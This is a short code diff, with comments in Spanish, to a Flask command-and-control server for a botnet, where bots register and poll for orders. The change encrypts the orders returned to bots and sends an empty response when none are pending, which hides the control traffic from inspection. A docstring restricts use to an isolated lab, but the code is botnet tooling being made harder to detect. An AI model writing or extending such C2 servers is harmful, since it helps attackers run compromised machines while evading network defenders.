@@ -5,6 +5,7 @@ El C&C es un servidor HTTP: los bots se registran y preguntan por su orden
 mediante polling. Uso solo en un laboratorio aislado y controlado.
 """
 from flask import Flask, request, jsonify
+from crypto import cifrar
 
 app = Flask(__name__)
 
@@ -24,8 +25,10 @@ def registro():
 @app.route("/ordenes/<bot_id>", methods=["GET"])
 def ordenes(bot_id):
     orden = ordenes_pendientes.get(bot_id)
-    ordenes_pendientes[bot_id] = None   # se la lleva y se borra
-    return jsonify({"orden": orden})
+    ordenes_pendientes[bot_id] = None
+    if not orden:
+        return b""
+    return cifrar(orden)
 
 @app.route("/nueva_orden", methods=["POST"])
 def nueva_orden():
